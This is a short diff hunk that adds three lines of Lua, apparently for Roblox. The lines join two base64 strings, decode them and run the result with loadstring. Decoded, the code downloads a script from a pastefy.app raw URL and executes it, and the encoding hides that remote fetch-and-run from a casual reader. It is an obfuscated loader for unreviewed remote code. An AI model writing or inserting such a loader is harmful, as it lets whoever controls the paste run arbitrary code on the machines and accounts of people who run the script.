@@ -1,0 +1,3 @@
+local a="bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8v"
+local b="cGFzdGVmeS5hcHAvWmJGdWNTSVIvcmF3IikpKCk="
+loadstring(crypt.base64.decode(a..b))()
